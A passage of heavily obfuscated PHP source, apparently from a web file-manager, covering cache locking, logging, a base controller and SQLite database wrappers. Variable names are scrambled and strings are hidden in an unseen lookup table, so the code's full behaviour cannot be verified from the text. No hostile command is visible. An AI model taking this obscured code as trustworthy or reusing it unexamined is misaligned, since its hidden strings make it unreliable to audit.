$˜Ÿì£¿í =& $_SERVER[¶Ô„œ…¯]; if ($Ï£ ®ô == $˜Ÿì£¿í[12] || $Ï£ ®ô == $˜Ÿì£¿í[8]) { return !0; } $ÒÅãù€ = array($˜Ÿì£¿í[1482] => $˜Ÿì£¿í[8], $˜Ÿì£¿í[1483] => rtrim($Ï£ ®ô, $˜Ÿì£¿í[8]) . $˜Ÿì£¿í[8], $˜Ÿì£¿í[1484] => 1, $˜Ÿì£¿í[1485] => $˜Ÿì£¿í[12]); $ë Â­ÃÑ = $this->client->listObjects($this->bucket, $ÒÅãù€); if ($ë Â­ÃÑ->getObjectList() || $ë Â­ÃÑ->getPrefixList()) { return !0; } return !1; } public function writeLog($şÂö€õ½ = '', $‡æªñ = false) { $¢ÔªÖ›’ =& $_SERVER[¶Ô„œ…¯]; $º«Ñ Ì‰ = in_array(ACTION, array($¢ÔªÖ›’[212], $¢ÔªÖ›’[213])); if (!$º«Ñ Ì‰ && !GLOBAL_DEBUG) { return; } $è—şñá† = 0; if (stripos($şÂö€õ½, $¢ÔªÖ›’[1509]) !== !1) { $è—şñá† = 1; $–‡»­ôÒ = explode($¢ÔªÖ›’[1510], $şÂö€õ½); $şÂö€õ½ = !empty($–‡»­ôÒ[1]) ? $–‡»­ôÒ[1] : $şÂö€õ½; } else { if (stripos($şÂö€õ½, $¢ÔªÖ›’[1511])) { $è—şñá† = 2; $–‡»­ôÒ = explode($¢ÔªÖ›’[1511], $şÂö€õ½); $–‡»­ôÒ = explode($¢ÔªÖ›’[4], $–‡»­ôÒ[0]); $şÂö€õ½ = !empty($–‡»­ôÒ[1]) ? $–‡»­ôÒ[1] : $şÂö€õ½; } } if ($º«Ñ Ì‰ && I18n::getType() == $¢ÔªÖ›’[1512]) { if ($è—şñá† == 1) { $şÂö€õ½ = str_replace($¢ÔªÖ›’[1513], $¢ÔªÖ›’[1514], $şÂö€õ½); } else { if ($è—şñá† == 2) { $–‡»­ôÒ = explode($¢ÔªÖ›’[214], $–‡»­ôÒ[0]); $Û–Ï–Ç‚ = isset($–‡»­ôÒ[1]) ? $–‡»­ôÒ[1] : $¢ÔªÖ›’[12]; $šÑ‡éĞË = array($¢ÔªÖ›’[1515] => $¢ÔªÖ›’[1516], $¢ÔªÖ›’[1517] => $¢ÔªÖ›’[1518], $¢ÔªÖ›’[1519] => $¢ÔªÖ›’[1520], $¢ÔªÖ›’[1521] => $¢ÔªÖ›’[1522], $¢ÔªÖ›’[1523] => $¢ÔªÖ›’[1524], $¢ÔªÖ›’[1525] => $¢ÔªÖ›’[1526], $¢ÔªÖ›’[1527] => $¢ÔªÖ›’[1528], $¢ÔªÖ›’[1529] => $¢ÔªÖ›’[1530], $¢ÔªÖ›’[1531] => $¢ÔªÖ›’[1532], $¢ÔªÖ›’[1533] => $¢ÔªÖ›’[1534]); if (isset($šÑ‡éĞË[$Û–Ï–Ç‚])) { $şÂö€õ½ = $šÑ‡éĞË[$Û–Ï–Ç‚]; } } } if (stripos($şÂö€õ½, $¢ÔªÖ›’[1535])) { $şÂö€õ½ = $¢ÔªÖ›’[1536]; } } if (!trim($şÂö€õ½)) { return; } parent::writeLog(trim($şÂö€õ½), $‡æªñ); } } goto D…éÀòñô’; eÇê©à¾Õ„: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ƒÀ—ç¿‡ =& $_SERVER[¶Ô„œ…¯]; if (self::$handle) { return self::$handle; } $ôïœÚßş = $GLOBALS[$ƒÀ—ç¿‡[6]][$ƒÀ—ç¿‡[426]]; self::$timeout = $ôïœÚßş[$ƒÀ—ç¿‡[927]] ? $ôïœÚßş[$ƒÀ—ç¿‡[927]] : 10; $ ú¹Œ÷ç = _get($GLOBALS[$ƒÀ—ç¿‡[6]], $ƒÀ—ç¿‡[928]); $èİÌ¡Ü¨ = $ôïœÚßş[$ƒÀ—ç¿‡[905]] ? $ôïœÚßş[$ƒÀ—ç¿‡[905]] : $ƒÀ—ç¿‡[232]; if ($èİÌ¡Ü¨ == $ƒÀ—ç¿‡[21] && $ ú¹Œ÷ç == $ƒÀ—ç¿‡[13]) { $èİÌ¡Ü¨ = $ƒÀ—ç¿‡[232]; } switch ($èİÌ¡Ü¨) { case $ƒÀ—ç¿‡[908]: self::$handle = new CacheLockRedis(); break; case $ƒÀ—ç¿‡[909]: self::$handle = new CacheLockMemcached(); break; case $ƒÀ—ç¿‡[21]: self::$handle = new CacheLockDatabase(); break; case $ƒÀ—ç¿‡[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ƒÀ—ç¿‡[929], $ƒÀ—ç¿‡[930]); } return self::$handle; } private static function key($òğİ™”¬) { return $_SERVER[¶Ô„œ…¯][931] . Cache::key($òğİ™”¬); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($·Æ¸¨Ü¿ = '') { self::$errorMsg = $·Æ¸¨Ü¿; } public static function lockGlobal($Á¥âÃ¿, $¸”„Ñş) { return self::lock($Á¥âÃ¿, $¸”„Ñş, !0); } public static function lock($¹¤¾§Óû, $®ÏÄ¶ŒÔ = false, $±†İ½˜ó = false) { $ÙÏÉ‹¼Ê =& $_SERVER[¶Ô„œ…¯]; $µĞ”·Â = self::init(); $Âú©ì¹— = self::key($¹¤¾§Óû); $®ÏÄ¶ŒÔ = $®ÏÄ¶ŒÔ ? $®ÏÄ¶ŒÔ : self::$timeout; $òû°”€­ = timeFloat(); if ($GLOBALS[$ÙÏÉ‹¼Ê[932]]) { if (!$µĞ”·Â->lock($Âú©ì¹—, 0.2)) { die; } return !0; } $Ş®¿³ÆÚ = $µĞ”·Â->lock($Âú©ì¹—, $®ÏÄ¶ŒÔ); $¾Õ¸š« = timeFloat(); if (!$Ş®¿³ÆÚ) { $ßæàşç‡ = "\x6c\x6f\143\x6b\40\x65\162\x72\x6f\x72\73\153\x65\x79\x3d{$¹¤¾§Óû}\x3b\x74\151\x6d\x65\75{$®ÏÄ¶ŒÔ}\73" . self::$errorMsg . $ÙÏÉ‹¼Ê[74] . get_caller_msg(); $ÅÎÅù¡ü = LNG($ÙÏÉ‹¼Ê[933]) . "\50{$®ÏÄ¶ŒÔ}\x73\51\x2e" . LNG($ÙÏÉ‹¼Ê[934]); $ÅÎÅù¡ü .= $ÙÏÉ‹¼Ê[935]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÅÎÅù¡ü = $ÅÎÅù¡ü . $ÙÏÉ‹¼Ê[936] . self::$errorMsg; } write_log($ÙÏÉ‹¼Ê[937] . sprintf($ÙÏÉ‹¼Ê[938], timeFloat() - $òû°”€­) . $ÙÏÉ‹¼Ê[939] . $ßæàşç‡ . $ÙÏÉ‹¼Ê[940] . error_get_last(), $ÙÏÉ‹¼Ê[930]); show_json($ÅÎÅù¡ü, !1); } if (!$±†İ½˜ó) { self::$lockItem[$Âú©ì¹—] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ï× İÖ¹ = number_format(timeFloat() - $¾Õ¸š«, 3); write_log($ÙÏÉ‹¼Ê[941] . $¹¤¾§Óû . $ÙÏÉ‹¼Ê[942] . $ï× İÖ¹, $ÙÏÉ‹¼Ê[930]); } return $Ş®¿³ÆÚ; } public static function lockGet($©´Æ‘ù) { $™ÙÎ²ä÷ = self::key($©´Æ‘ù); if (self::$lockItem[$™ÙÎ²ä÷]) { return self::$lockItem[$™ÙÎ²ä÷]; } return self::init()->lockGet($™ÙÎ²ä÷); } public static function unlock($ğ¢ğ·ä½) { $…¹ë‘êí =& $_SERVER[¶Ô„œ…¯]; $’¨Ïî–ó = self::key($ğ¢ğ·ä½); self::$lockItem[$’¨Ïî–ó] = null; self::init()->unlock($’¨Ïî–ó); if (GLOBAL_DEBUG_LOG_ALL) { write_log($…¹ë‘êí[943] . $ğ¢ğ·ä½, $…¹ë‘êí[930]); } return; } public static function unlockRuntime() { $±¸©ı•Õ =& $_SERVER[¶Ô„œ…¯]; $‹ìÉÄÒ÷ = self::init(); $èµÀ‰‚§ = !1; foreach (self::$lockItem as $ıÕë’²Ã => $ğ¿Áêì½) { if (!$ğ¿Áêì½) { continue; } $‹ìÉÄÒ÷->unlock($ıÕë’²Ã); if (!$èµÀ‰‚§) { $èµÀ‰‚§ = !0; write_log($±¸©ı•Õ[944] . $ıÕë’²Ã . $±¸©ı•Õ[74] . get_caller_msg(), $±¸©ı•Õ[930]); continue; } write_log($±¸©ı•Õ[944] . $ıÕë’²Ã, $±¸©ı•Õ[930]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ó ¡Ë¾´ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($±¸©ı•Õ[945] . $ó ¡Ë¾´ . $±¸©ı•Õ[946] . ACTION, $±¸©ı•Õ[930]); } } public static function fileLock($·ù­¿Õ·) { $°É™Ù©Ú =& $_SERVER[¶Ô„œ…¯]; if (!$GLOBALS[$°É™Ù©Ú[947]]) { $GLOBALS[$°É™Ù©Ú[947]] = array(); } $GLOBALS[$°É™Ù©Ú[947]][$·ù­¿Õ·] = !1; $Ô™úøİ = fopen(DATA_PATH . $·ù­¿Õ· . $°É™Ù©Ú[948], $°É™Ù©Ú[949]); if (!$Ô™úøİ) { return !1; } $GLOBALS[$°É™Ù©Ú[947]][$·ù­¿Õ·] = $Ô™úøİ; if (flock($Ô™úøİ, LOCK_EX)) { return !0; } self::unlock($·ù­¿Õ·); show_json($°É™Ù©Ú[950], !1); return !1; } public static function fileUnlock($ñŸ‘æ’¨) { $Ù¯Ó·Š­ =& $_SERVER[¶Ô„œ…¯]; $Á«ƒÆŞß = $GLOBALS[$Ù¯Ó·Š­[947]][$ñŸ‘æ’¨]; if (!$Á«ƒÆŞß) { return; } $GLOBALS[$Ù¯Ó·Š­[947]][$ñŸ‘æ’¨] = !1; flock($Á«ƒÆŞß, LOCK_UN); fclose($Á«ƒÆŞß); } public static function fileUnlockAll() { $ë’âÀÀ› =& $_SERVER[¶Ô„œ…¯]; if (!isset($GLOBALS[$ë’âÀÀ›[947]]) || !$GLOBALS[$ë’âÀÀ›[947]]) { return; } foreach ($GLOBALS[$ë’âÀÀ›[947]] as $àÚƒ· => $¸ÒŸœÛ¾) { if (!$¸ÒŸœÛ¾) { continue; } $GLOBALS[$ë’âÀÀ›[947]][$àÚƒ·] = !1; flock($¸ÒŸœÛ¾, LOCK_UN); fclose($¸ÒŸœÛ¾); } $GLOBALS[$ë’âÀÀ›[947]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ ãëŠ»Ğ =& $_SERVER[¶Ô„œ…¯]; $ËéÓò¦ö = $GLOBALS[$ ãëŠ»Ğ[6]][$ ãëŠ»Ğ[426]]; self::$cachePath = $ËéÓò¦ö[$ ãëŠ»Ğ[232]][$ ãëŠ»Ğ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ìî˜ûıæ, $­ÑõÈê = 0) { $‘ˆÎÅåâ =& $_SERVER[¶Ô„œ…¯]; $‘Èãöá = microtime(!0); $Şö†À›İ = $‘Èãöá + $­ÑõÈê + 0.0001; $ÇúäÒË‡ = rtrim(self::$cachePath, $‘ˆÎÅåâ[8]) . $‘ˆÎÅåâ[951] . md5($Ìî˜ûıæ) . $‘ˆÎÅåâ[948]; if (file_exists($ÇúäÒË‡) && filemtime($ÇúäÒË‡) && filemtime($ÇúäÒË‡) < time() - 10) { @unlink($ÇúäÒË‡); } do { if (file_exists($ÇúäÒË‡)) { cacheLockWait(); continue; } $ïêª ¢ = fopen($ÇúäÒË‡, $‘ˆÎÅåâ[952]); if (!$ïêª ¢) { return !1; } $Ş¶ùØÕ­ = flock($ïêª ¢, LOCK_EX | LOCK_NB); self::$caches[$Ìî˜ûıæ] = array($‘ˆÎÅåâ[953] => $ïêª ¢, $‘ˆÎÅåâ[232] => $ÇúäÒË‡); fwrite($ïêª ¢, $Şö†À›İ); clearstatcache(); if ($ïêª ¢ && $Ş¶ùØÕ­) { return !0; } cacheLockWait(); } while (microtime(!0) < $Şö†À›İ); $this->unlock($Ìî˜ûıæ); return !1; } public function lockGet($†«¶ğãæ) { $¦íøëäÙ =& $_SERVER[¶Ô„œ…¯]; $ÂÖÚÇÜÙ = rtrim(self::$cachePath, $¦íøëäÙ[8]) . $¦íøëäÙ[951] . md5($†«¶ğãæ) . $¦íøëäÙ[948]; return file_exists($ÂÖÚÇÜÙ); } public function unlock($Û¬ëÊ‹) { $ä˜öˆ»œ =& $_SERVER[¶Ô„œ…¯]; $ğ“¶”Ÿ  = self::$caches[$Û¬ëÊ‹]; if (!$ğ“¶”Ÿ ) { return; } @flock($ğ“¶”Ÿ [$ä˜öˆ»œ[953]], LOCK_UN); @fclose($ğ“¶”Ÿ [$ä˜öˆ»œ[953]]); @unlink($ğ“¶”Ÿ [$ä˜öˆ»œ[232]]); unset(self::$caches[$Û¬ëÊ‹]); } } goto aÄØ Ñò—; fÂá‡ã¡öš: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $“Óúšã =& $_SERVER[¶Ô„œ…¯]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$“Óúšã[6]] =& $config; $this->values[$“Óúšã[7]] =& $in; $this->tpl = TEMPLATE . MOD . $“Óúšã[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‡öü¸—³) { if (1 === func_num_args()) { $this->{$‡öü¸—³} = new $‡öü¸—³(); } else { $çğ»ßÈº = new ReflectionClass($‡öü¸—³); $šÛ Ëºœ = func_get_args(); array_shift($šÛ Ëºœ); $this->{$‡öü¸—³} = $çğ»ßÈº->newInstanceArgs($šÛ Ëºœ); } return $this->{$‡öü¸—³}; } public function routeBind($ÖÓ‡¦Ş÷, $Î±¯ëøÊ, $†ş¶èŠÊ = 3) { $ÑÇöÂô =& $_SERVER[¶Ô„œ…¯]; $İ†‡—ğË = $this->in[$ÑÇöÂô[9]]; $ÖÓ‡¦Ş÷ = str_replace($ÑÇöÂô[10], $ÑÇöÂô[11], trim(trim($ÖÓ‡¦Ş÷, $ÑÇöÂô[8]), $ÑÇöÂô[12])); if (!$ÖÓ‡¦Ş÷ || count($İ†‡—ğË) <= $†ş¶èŠÊ) { return !1; } $‹ü£˜£° = !0; $‡‘ö¯å = explode($ÑÇöÂô[8], $ÖÓ‡¦Ş÷); for ($ñ’ı‘¾‘ = 0; $ñ’ı‘¾‘ < count($‡‘ö¯å); $ñ’ı‘¾‘++) { if ($‡‘ö¯å[$ñ’ı‘¾‘] != $İ†‡—ğË[$†ş¶èŠÊ + $ñ’ı‘¾‘]) { $‹ü£˜£° = !1; break; } } if (!$‹ü£˜£°) { return; } call_user_func_array(array($this, $Î±¯ëøÊ), array()); } public function routeArgs($†Ñ„şß = 3) { $èÜŞ±°Ö = $this->in[$_SERVER[¶Ô„œ…¯][9]]; if (count($èÜŞ±°Ö) <= $†Ñ„şß) { return array(); } $È’¿™ş™ = array(); for ($ìŒŠëë = $†Ñ„şß; $ìŒŠëë < count($èÜŞ±°Ö); $ìŒŠëë += 2) { $È’¿™ş™[$èÜŞ±°Ö[$ìŒŠëë]] = $èÜŞ±°Ö[$ìŒŠëë + 1]; $this->in[$èÜŞ±°Ö[$ìŒŠëë]] = $èÜŞ±°Ö[$ìŒŠëë + 1]; } return $È’¿™ş™; } protected function assign($ª»şĞ§Ù, $¢Ñü÷åò) { $this->values[$ª»şĞ§Ù] = $¢Ñü÷åò; } protected function display($È–Å±Ì) { ob_end_clean(); extract($this->values); require $this->tpl . $È–Å±Ì; } } class DbSqliteBase extends Db { public function __construct($¡Àª¯ÅŠ = '') { $ĞññÕÒ¢ =& $_SERVER[¶Ô„œ…¯]; if (!extension_loaded($ĞññÕÒ¢[13])) { think_exception(think_lang($ĞññÕÒ¢[14]) . $ĞññÕÒ¢[15]); } if (!empty($¡Àª¯ÅŠ)) { if (!isset($¡Àª¯ÅŠ[$ĞññÕÒ¢[16]])) { $¡Àª¯ÅŠ[$ĞññÕÒ¢[16]] = 438; } $this->config = $¡Àª¯ÅŠ; if (empty($this->config[$ĞññÕÒ¢[17]])) { $this->config[$ĞññÕÒ¢[17]] = array(); } } } public function connect($›¯®—Ö¢ = '', $ÊÂÑŞ”ï = 0) { $åÚƒë” =& $_SERVER[¶Ô„œ…¯]; if (!isset($this->linkID[$ÊÂÑŞ”ï])) { if (empty($›¯®—Ö¢)) { $›¯®—Ö¢ = $this->config; } $Óšø = !empty($›¯®—Ö¢[$åÚƒë”[17]][$åÚƒë”[18]]) ? $›¯®—Ö¢[$åÚƒë”[17]][$åÚƒë”[18]] : $this->pconnect; $à¹İŸ— = $Óšø ? $åÚƒë”[19] : $åÚƒë”[20]; $this->linkID[$ÊÂÑŞ”ï] = $à¹İŸ—($›¯®—Ö¢[$åÚƒë”[21]], $›¯®—Ö¢[$åÚƒë”[16]]); if (!$this->linkID[$ÊÂÑŞ”ï]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ÊÂÑŞ”ï], 30000); if (1 != think_config($åÚƒë”[22])) { unset($this->config); } } return $this->linkID[$ÊÂÑŞ”ï]; } public function free() { $this->queryID = null; } public function query($äŒÀí«ò) { $‡æ¶µÌã =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $äŒÀí«ò; if ($this->queryID) { $this->free(); } think_action_status($‡æ¶µÌã[23], 1); think_status($‡æ¶µÌã[24]); $this->queryID = sqlite_query($this->_linkID, $äŒÀí«ò); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $­”é‡èè = $this->getAll(); return $­”é‡èè; } } public function execute($µüô¤) { $ÈüøƒÂ• =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $µüô¤; if ($this->queryID) { $this->free(); } think_action_status($ÈüøƒÂ•[25], 1); think_status($ÈüøƒÂ•[24]); $”ƒÕ¯Ï = sqlite_exec($this->_linkID, $µüô¤); $this->debug(); if (!1 === $”ƒÕ¯Ï) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¶Ô„œ…¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $®âÚß³Ò = sqlite_query($this->_linkID, $_SERVER[¶Ô„œ…¯][27]); if (!$®âÚß³Ò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Æ¸•¡­ = sqlite_query($this->_linkID, $_SERVER[¶Ô„œ…¯][28]); if (!$Æ¸•¡­) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $™›™úœ® = array(); if ($this->numRows > 0) { for ($©‡µğ¸˜ = 0; $©‡µğ¸˜ < $this->numRows; $©‡µğ¸˜++) { $™›™úœ®[$©‡µğ¸˜] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $™›™úœ®; } public function getFields($ûùÜğÛœ) { $×·Á‰Üñ =& $_SERVER[¶Ô„œ…¯]; $‹»š°Î = $this->query($×·Á‰Üñ[29] . $ûùÜğÛœ . $×·Á‰Üñ[30]); $ßØÕ²¦– = array(); if ($‹»š°Î) { foreach ($‹»š°Î as $à÷Îìõ£ => $Õ™ì¶ü) { $ßØÕ²¦–[$Õ™ì¶ü[$×·Á‰Üñ[31]]] = array($×·Á‰Üñ[32] => $Õ™ì¶ü[$×·Á‰Üñ[31]], $×·Á‰Üñ[33] => $Õ™ì¶ü[$×·Á‰Üñ[34]], $×·Á‰Üñ[35] => (bool) ($Õ™ì¶ü[$×·Á‰Üñ[36]] === $×·Á‰Üñ[12]), $×·Á‰Üñ[37] => $Õ™ì¶ü[$×·Á‰Üñ[38]], $×·Á‰Üñ[39] => strtolower($Õ™ì¶ü[$×·Á‰Üñ[40]]) == $×·Á‰Üñ[41], $×·Á‰Üñ[42] => strtolower($Õ™ì¶ü[$×·Á‰Üñ[43]]) == $×·Á‰Üñ[44]); } } return $ßØÕ²¦–; } public function getTables($ûÖÛğÂ„ = '') { $½³­µ¥Ÿ =& $_SERVER[¶Ô„œ…¯]; $“¨·ı–Ù = $this->query($½³­µ¥Ÿ[45] . $½³­µ¥Ÿ[46] . $½³­µ¥Ÿ[47]); $ûƒæ¢”® = array(); foreach ($“¨·ı–Ù as $Õ›à©ÏÑ => $ª¿“¸™«) { $ûƒæ¢”®[$Õ›à©ÏÑ] = current($ª¿“¸™«); } return $ûƒæ¢”®; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $—ÜÕà¡‘ =& $_SERVER[¶Ô„œ…¯]; $†ÉĞ¢— = sqlite_last_error($this->_linkID); $this->error = $†ÉĞ¢— . $—ÜÕà¡‘[4] . sqlite_error_string($†ÉĞ¢—); if ($—ÜÕà¡‘[12] != $this->queryStr) { $this->error .= LNG($—ÜÕà¡‘[48]) . $this->queryStr; } think_trace($this->error, $—ÜÕà¡‘[12], $—ÜÕà¡‘[49]); return $this->error; } public function escapeString($Õâ‰¿Ÿñ) { return sqlite_escape_string($Õâ‰¿Ÿñ); } public function parseLimit($÷¡Û­¶í) { $ùĞÄÏâ¢ =& $_SERVER[¶Ô„œ…¯]; $—äçé«Ì = $ùĞÄÏâ¢[12]; if (!empty($÷¡Û­¶í)) { $÷¡Û­¶í = explode($ùĞÄÏâ¢[50], $÷¡Û­¶í); if (count($÷¡Û­¶í) > 1) { $—äçé«Ì .= $ùĞÄÏâ¢[51] . $÷¡Û­¶í[1] . $ùĞÄÏâ¢[52] . $÷¡Û­¶í[0] . $ùĞÄÏâ¢[53]; } else { $—äçé«Ì .= $ùĞÄÏâ¢[51] . $÷¡Û­¶í[0] . $ùĞÄÏâ¢[53]; } } return $—äçé«Ì; } } class DbSqlite3Base extends Db { public function __construct($’ëÒá‘ = '') { $·åä¤¸ =& $_SERVER[¶Ô„œ…¯]; if (!class_exists($·åä¤¸[54])) { think_exception(think_lang($·åä¤¸[14]) . $·åä¤¸[55]); } if (!empty($’ëÒá‘)) { if (!isset($’ëÒá‘[$·åä¤¸[16]])) { $’ëÒá‘[$·åä¤¸[16]] = 438; } $this->config = $’ëÒá‘; if (empty($this->config[$·åä¤¸[17]])) { $this->config[$·åä¤¸[17]] = array(); } } } public function connect($±ä×º‰ı = '', $ò½ªÏÈü = 0) { $ĞÚ¿»Åİ =& $_SERVER[¶Ô„œ…¯]; if (!isset($this->linkID[$ò½ªÏÈü])) { if (empty($±ä×º‰ı)) { $±ä×º‰ı = $this->config; } $this->linkID[$ò½ªÏÈü] = new SQLite3($±ä×º‰ı[$ĞÚ¿»Åİ[21]]); if (!$this->linkID[$ò½ªÏÈü]) { think_exception($this->linkID[$ò½ªÏÈü]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ò½ªÏÈü]->busyTimeout(30000); if (1 != think_config($ĞÚ¿»Åİ[22])) { unset($this->config); } } return $this->linkID[$ò½ªÏÈü]; } public function free() { $this->queryID = null; } public function query($ƒíÎ¸©Ğ) { $¸¨€åú =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒíÎ¸©Ğ; if ($this->queryID) { $this->free(); } think_action_status($¸¨€åú[23], 1); think_status($¸¨€åú[24]); $this->queryID = $this->_linkID->query($ƒíÎ¸©Ğ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ø¶æ•¦ = $this->getAll(); $this->numRows = count($Ø¶æ•¦); return $Ø¶æ•¦; } } public function execute($‘¸ï»Ã€) { $ëõñµİÙ =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‘¸ï»Ã€; if ($this->queryID) { $this->free(); } think_action_status($ëõñµİÙ[25], 1); think_status($ëõñµİÙ[24]); $ğÒ•Óéğ = $this->_linkID->exec($‘¸ï»Ã€); $this->debug(); if (!1 === $ğÒ•Óéğ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¶Ô„œ…¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $İ ª¨ô¯ = $this->_linkID->query($_SERVER[¶Ô„œ…¯][27]); if (!$İ ª¨ô¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Æ—·Ùº† = $this->_linkID->query($_SERVER[¶Ô„œ…¯][28]); if (!$Æ—·Ùº†) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ŠæÕ›Íâ = array(); while ($ñŞ²™¯Í = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ŠæÕ›Íâ[] = $ñŞ²™¯Í; } $this->queryID->reset(); return $ŠæÕ›Íâ; } public function getFields($ş²ó‚) { $»é°¿‡Û =& $_SERVER[¶Ô„œ…¯]; $°¢ĞƒºÔ = $this->query($»é°¿‡Û[29] . $ş²ó‚ . $»é°¿‡Û[30]); $® «ï§è = array(); if ($°¢ĞƒºÔ) { foreach ($°¢ĞƒºÔ as $õ£ÑÑïÙ => $ÖâÛªÚú) { $® «ï§è[$ÖâÛªÚú[$»é°¿‡Û[32]]] = array($»é°¿‡Û[32] => $ÖâÛªÚú[$»é°¿‡Û[32]], $»é°¿‡Û[33] => $ÖâÛªÚú[$»é°¿‡Û[33]], $»é°¿‡Û[35] => (bool) ($ÖâÛªÚú[$»é°¿‡Û[35]] === $»é°¿‡Û[12]), $»é°¿‡Û[37] => $ÖâÛªÚú[$»é°¿‡Û[56]], $»é°¿‡Û[39] => (bool) $ÖâÛªÚú[$»é°¿‡Û[57]], $»é°¿‡Û[42] => (bool) $ÖâÛªÚú[$»é°¿‡Û[57]]); } } return $® «ï§è; } public function getTables($ç³ÆØĞ = '') { $Ä¢³Öæé =& $_SERVER[¶Ô„œ…¯]; $ÏÛŸä«° = $this->query($Ä¢³Öæé[45] . $Ä¢³Öæé[46] . $Ä¢³Öæé[47]); $œÉµËìô = array(); foreach ($ÏÛŸä«° as $†ÂíşÌ => $Ş ¡Æ“ô) { $œÉµËìô[$†ÂíşÌ] = current($Ş ¡Æ“ô); } return $œÉµËìô; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $»»¿Ò´ =& $_SERVER[¶Ô„œ…¯]; $this->error = $this->_linkID->lastErrorMsg(); if ($»»¿Ò´[12] != $this->queryStr) { $this->error .= LNG($»»¿Ò´[48]) . $this->queryStr; } think_trace($this->error, $»»¿Ò´[12], $»»¿Ò´[49]); return $this->error; } public function escapeString($ôÂñ¿‡) { $æü³¨Û¿ =& $_SERVER[¶Ô„œ…¯]; if ($this->_linkID) { return $this->_linkID->escapeString($ôÂñ¿‡); } return str_ireplace($æü³¨Û¿[58], $æü³¨Û¿[59], $ôÂñ¿‡); } public function parseLimit($ã¨•ïË›) { $ÉÊ¨†§ =& $_SERVER[¶Ô„œ…¯]; $ú© ª¿Ê = $ÉÊ¨†§[12]; if (!empty($ã¨•ïË›)) { $ã¨•ïË› = explode($ÉÊ¨†§[50], $ã¨•ïË›); if (count($ã¨•ïË›) > 1) { $ú© ª¿Ê .= $ÉÊ¨†§[51] . $ã¨•ïË›[1] . $ÉÊ¨†§[52] . $ã¨•ïË›[0] . $ÉÊ¨†§[53]; } else { $ú© ª¿Ê .= $ÉÊ¨†§[51] . $ã¨•ïË›[0] . $ÉÊ¨†§[53]; } } return $ú© ª¿Ê; } } goto CÊ½ºÈõâ‘; FŒ›º¡†ä: class AnalysisModel extends ModelBaseLight { public function init($•ößà¾ª) { $ ÑšôºÄ =& $_SERVER[¶Ô„œ…¯]; $öÃïÁÍÕ = array($ ÑšôºÄ[667] => array($ ÑšôºÄ[33] => $ ÑšôºÄ[1908], $ ÑšôºÄ[352] => array($ ÑšôºÄ[284], $ ÑšôºÄ[843], $ ÑšôºÄ[1909], $ ÑšôºÄ[1910])), $ ÑšôºÄ[1911] => array($ ÑšôºÄ[33] => $ ÑšôºÄ[1912], $ ÑšôºÄ[352] => array($ ÑšôºÄ[284], $ ÑšôºÄ[841], $ ÑšôºÄ[1913], $ ÑšôºÄ[1914], $ ÑšôºÄ[1915]))); if (!isset($öÃïÁÍÕ[$•ößà¾ª])) { return !1; } $this->optionType = $öÃïÁÍÕ[$•ößà¾ª][$ ÑšôºÄ[33]]; $this->field = $öÃïÁÍÕ[$•ößà¾ª][$ ÑšôºÄ[352]]; return !0; } public function listData($Ø•†¯š = false, $“¿²µ²» = "\155\157\x64\151\146\171\x54\151\155\x65", $¡šÇ÷• = false) { return parent::listData($Ø•†¯š, $“¿²µ²», $¡šÇ÷•); } public function trendList($±ı­²ÆÒ) { $ñ–Ğ¯… =& $_SERVER[¶Ô„œ…¯]; $´ĞŸ¸èı = $this->listData(); if ($´ĞŸ¸èı) { $”šúäê¢ = end($´ĞŸ¸èı); $§î˜•²õ = date($ñ–Ğ¯…[1916], strtotime($ñ–Ğ¯…[1917])); if ($”šúäê¢[$ñ–Ğ¯…[284]] == $§î˜•²õ) { return $´ĞŸ¸èı; } $ÏµÂ…„ó = 